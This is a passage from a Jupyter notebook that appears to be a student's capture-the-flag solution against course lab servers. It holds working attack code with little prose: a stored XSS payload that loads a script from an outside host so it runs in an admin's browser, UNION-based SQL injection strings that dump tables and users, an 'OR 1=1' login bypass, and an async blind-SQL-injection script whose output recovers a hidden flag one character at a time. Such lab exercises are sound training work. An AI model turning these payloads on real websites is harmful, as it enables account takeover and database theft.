      "                  <input class=\"form-control\" name=\"link\" id=\"titleField\" value=\"bc819456266596e4fa51e5dc58dd9bef751597719f6d9b1917edb807dffe929c\" hidden>\n",
      "                  <legend>\n",
      "                      Your post is under review by our admins.<br>\n",
      "                      <b>Thanks for contributing!</b>\n",
      "                    </legend>\n",
      "                    <hr class=\"half-rule\" color=\"grey\" />\n",
      "                    <br>\n",
      "                    <center> <h3> yoyoyo </h3> </center>\n",
      "                    <hr class=\"half-rule\" color=\"grey\" />\n",
      "                  <button type=\"submit\" class=\"btn btn-primary\" formaction=\"/update_post_under_review\">Update post</button>\n",
      "                </fieldset>\n",
      "              </form>\n",
      "        </div>\n",
      "        <div class=\"col-3\">\n",
      "        </div>\n",
      "    </div>\n",
      "</div>\n",
      "\n",
      "\n",
      "\n"
     ]
    }
   ],
   "source": [
    "steal = '''</textarea>\n",
    "<script type=\"application/javascript\" src=\"https://ctf-ssof.000webhostapp.com/twitterstyle.js\"></script>\n",
    "'''.replace('\\n', '')\n",
    "print(len(steal))\n",
    "BASE_URL = 'http://mustard.stt.rnl.tecnico.ulisboa.pt:12007'\n",
    "r = requests.post(url=f'{BASE_URL}/submit_for_admin_review', data={\n",
    "    'link': 'bc819456266596e4fa51e5dc58dd9bef751597719f6d9b1917edb807dffe929c',\n",
    "    'content': steal,\n",
    "})\n",
    "print(r.text)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 119,
   "metadata": {},
   "outputs": [
    {
     "ename": "SyntaxError",
     "evalue": "invalid syntax (<ipython-input-119-99500aa62ab9>, line 1)",
     "output_type": "error",
     "traceback": [
      "\u001b[0;36m  File \u001b[0;32m\"<ipython-input-119-99500aa62ab9>\"\u001b[0;36m, line \u001b[0;32m1\u001b[0m\n\u001b[0;31m    list all tables:\u001b[0m\n\u001b[0m         ^\u001b[0m\n\u001b[0;31mSyntaxError\u001b[0m\u001b[0;31m:\u001b[0m invalid syntax\n"
     ]
    }
   ],
   "source": [
    "list all tables:\n",
    "l%' AND 1=2 UNION SELECT type as id, name as content, tbl_name as title FROM sqlite_master;--\n",
    "\n",
    "\n",
    "listl user table columns\n",
    "%' AND 1=2 UNION ALL SELECT name as id, name as content, name as title FROM PRAGMA_TABLE_INFO('user');--\n",
    "\n",
    "list all users\n",
    "%' AND 1=2 UNION ALL SELECT id as id, jackpot_val as content, username as title FROM user;--\n",
    "\n",
    "\n",
    "list secret_blog_post table columns\n",
    "%' AND 1=2 UNION ALL SELECT name as id, name as content, name as title FROM PRAGMA_TABLE_INFO('secret_blog_post');--\n",
    "\n",
    "list all contents of the secret_blog_post\n",
    "%' AND 1=2 UNION ALL SELECT id as id, content as content, title as title FROM secret_blog_post;--\n",
    "\n",
    "\n",
    "\n",
    "login as admin\n",
    "login: admin\n",
    "password:\n",
    "bik' OR 1=1;--"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "SERVER='http://mustard.stt.rnl.tecnico.ulisboa.pt:12102/'\n",
    "headers = {'user-agent': 'my-app/0.0.1', 'Content-Type': 'application/json'}\n",
    "\n",
    "\n",
    "async def nb_found(query):\n",
    "    params = {'search': query}\n",
    "    r = requests.get(SERVER, params=params, headers=headers)\n",
    "\n",
    "    return int(r.text.split('Found')[-1].split('articles')[0].strip())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 45,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[1, 1]"
      ]
     },
     "execution_count": 45,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import asyncio\n",
    "\n",
    "await asyncio.gather(*[\n",
    "    nb_found(f\"l%' AND 1=2 UNION SELECT type as id, name as content, tbl_name as title FROM sqlite_master WHERE content LIKE 'u%';--\"),\n",
    "    nb_found(f\"l%' AND 1=2 UNION SELECT type as id, name as content, tbl_name as title FROM sqlite_master WHERE content LIKE 'u%';--\"),\n",
    "])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 56,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Processing `super_s_sof_s`... \t Found 1 tables\n",
      "Processing `super_s_sof_se`... \t Found 1 tables\n",
      "Processing `super_s_sof_sec`... \t Found 1 tables\n",
      "Processing `super_s_sof_secr`... \t Found 1 tables\n",
      "Processing `super_s_sof_secre`... \t Found 1 tables\n",
      "Processing `super_s_sof_secret`... \t Found 1 tables\n",
      "Processing `super_s_sof_secrets`... \t Found 1 tables\n",
      "super_s_sof_secrets ['super_s_sof_secrets']\n",
      "super_s_sof_secret ['super_s_sof_secrets']\n",
      "super_s_sof_secre ['super_s_sof_secrets']\n",
      "super_s_sof_secr ['super_s_sof_secrets']\n",
      "super_s_sof_sec ['super_s_sof_secrets']\n",
      "super_s_sof_se ['super_s_sof_secrets']\n",
      "super_s_sof_s ['super_s_sof_secrets']\n",
      "super_s_sof_ ['super_s_sof_secrets']\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "['super_s_sof_secrets']"
      ]
     },
     "execution_count": 56,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import string\n",
    "\n",
    "\n",
    "alphabet = string.ascii_lowercase + '_'\n",
    "\n",
    "\n",
    "async def find_table_names(prefix, limit):\n",
    "    res = []\n",
    "    last = True\n",
    "    \n",
    "#     if prefix.count('_') >= 3:\n",
    "#         return res\n",
    "    \n",
    "    nb_founds = await asyncio.gather(*[\n",
    "        nb_found(f\"l%' AND 1=2 UNION SELECT type as id, name as content, tbl_name as title FROM sqlite_master WHERE content LIKE '{prefix + c}%';--\")\n",
    "        for c in alphabet\n",
    "    ])\n",
    "    \n",
    "    for num, c in zip(nb_founds, alphabet):\n",
    "        if num != 0:\n",
    "            print(f'Processing `{prefix + c}`... \\t Found {num} tables')\n",
    "            res += await find_table_names(prefix + c, num)\n",
    "            last = False\n",
    "        if num == limit:\n",
    "            break\n",
    "    \n",
    "    if last:\n",
    "        res.append(prefix)\n",
    "    print(prefix, res)\n",
    "    return res\n",
    "\n",
    "await find_table_names('super_s_sof_', 1)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 79,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0"
      ]
     },
     "execution_count": 79,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "await nb_found(\"%' AND 1=2 UNION ALL SELECT \"\\\n",
    "               \"name as id, name as content, name as title \"\\\n",
    "               \"FROM PRAGMA_TABLE_INFO('super_s_sof_secrets') WHERE name LIKE 'id%';--\")\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 111,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "1"
      ]
     },
     "execution_count": 111,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "await nb_found(\"%' AND 1=2 UNION ALL SELECT \"\\\n",
    "               \"id as id, secret as content, secret as title \"\\\n",
    "               \"FROM super_s_sof_secrets WHERE secret GLOB 'I*';--\")\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 108,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "302231454903657293676544"
      ]
     },
     "execution_count": 108,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "2**78"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 116,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'"
      ]
     },
     "execution_count": 116,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "string.ascii_letters"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 118,
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Processing `I`... \t Found 1 tables\n",
      "Processing `In`... \t Found 1 tables\n",
      "Processing `In `... \t Found 1 tables\n",
      "Processing `In c`... \t Found 1 tables\n",
      "Processing `In ca`... \t Found 1 tables\n",
      "Processing `In cas`... \t Found 1 tables\n",
      "Processing `In case`... \t Found 1 tables\n",
      "Processing `In case `... \t Found 1 tables\n",
      "Processing `In case I`... \t Found 1 tables\n",
      "Processing `In case I `... \t Found 1 tables\n",
      "Processing `In case I f`... \t Found 1 tables\n",
      "Processing `In case I fo`... \t Found 1 tables\n",
      "Processing `In case I for`... \t Found 1 tables\n",
      "Processing `In case I forg`... \t Found 1 tables\n",
      "Processing `In case I forge`... \t Found 1 tables\n",
      "Processing `In case I forget`... \t Found 1 tables\n",
      "Processing `In case I forget `... \t Found 1 tables\n",
      "Processing `In case I forget m`... \t Found 1 tables\n",
      "Processing `In case I forget my`... \t Found 1 tables\n",
      "Processing `In case I forget my `... \t Found 1 tables\n",
      "Processing `In case I forget my p`... \t Found 1 tables\n",
      "Processing `In case I forget my pa`... \t Found 1 tables\n",
      "Processing `In case I forget my pas`... \t Found 1 tables\n",
      "Processing `In case I forget my pass`... \t Found 1 tables\n",
      "Processing `In case I forget my passw`... \t Found 1 tables\n",
      "Processing `In case I forget my passwo`... \t Found 1 tables\n",
      "Processing `In case I forget my passwor`... \t Found 1 tables\n",
      "Processing `In case I forget my password`... \t Found 1 tables\n",
      "Processing `In case I forget my password `... \t Found 1 tables\n",
      "Processing `In case I forget my password i`... \t Found 1 tables\n",
      "Processing `In case I forget my password is`... \t Found 1 tables\n",
      "Processing `In case I forget my password is:`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: `... \t Found 1 tables\n",
      "Processing `In case I forget my password is: S`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SS`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSo`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_B`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Bl`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Bli`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blin`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind_`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind_b`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind_bu`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind_but`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind_but_`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind_but_I`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind_but_I_`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind_but_I_c`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind_but_I_ca`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind_but_I_can`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind_but_I_can_`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind_but_I_can_S`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind_but_I_can_St`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind_but_I_can_Sti`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind_but_I_can_Stil`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind_but_I_can_Still`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind_but_I_can_Still_`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind_but_I_can_Still_g`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind_but_I_can_Still_gE`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind_but_I_can_Still_gEt`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind_but_I_can_Still_gEt_`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind_but_I_can_Still_gEt_y`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind_but_I_can_Still_gEt_yo`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind_but_I_can_Still_gEt_yoU`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind_but_I_can_Still_gEt_yoUr`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind_but_I_can_Still_gEt_yoUr_`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind_but_I_can_Still_gEt_yoUr_d`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind_but_I_can_Still_gEt_yoUr_da`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind_but_I_can_Still_gEt_yoUr_dat`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind_but_I_can_Still_gEt_yoUr_datA`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind_but_I_can_Still_gEt_yoUr_datA}`... \t Found 1 tables\n"
     ]
    }
   ],
   "source": [
    "final_target = 'in_case_i_forget_my_password_is__ssof{i_m_blind_but_i_can_still_get_your_data}'\n",
    "alphabet = string.ascii_lowercase + \"{}_' -\"\n",
    "async def find_column_contents(prefix, limit):\n",
    "    \n",
    "#     if prefix.count('_') >= 3:\n",
    "#         return res\n",
    "    \n",
    "    i = len(prefix)\n",
    "    if i >= len(final_target):\n",
    "        return\n",
    "    if final_target[i] == '_':\n",
    "        choice = \"{}-_ ':;\"\n",
    "    else:\n",
    "        choice = set([final_target[i].lower(), final_target[i].upper()])\n",
    "    \n",
    "    nb_founds = await asyncio.gather(*[\n",
    "        nb_found(f\"%' AND 1=2 UNION ALL SELECT id as id, secret as content, secret as title FROM super_s_sof_secrets WHERE secret GLOB '{prefix + c}*';--\")\n",
    "        for c in choice\n",
    "    ])\n",
    "    \n",
    "    for num, c in zip(nb_founds, choice):\n",
    "        if num != 0:\n",
    "            print(f'Processing `{prefix + c}`... \\t Found {num} tables')\n",
    "            await find_column_contents(prefix + c, num)\n",
    "#         if num == limit:\n",
    "#             break\n",
    "\n",
    "await find_column_contents('', 1)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "in_case_i_forget_my_password_is__ssof{i_m_blind_but_i_can_still_get_your_data}"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
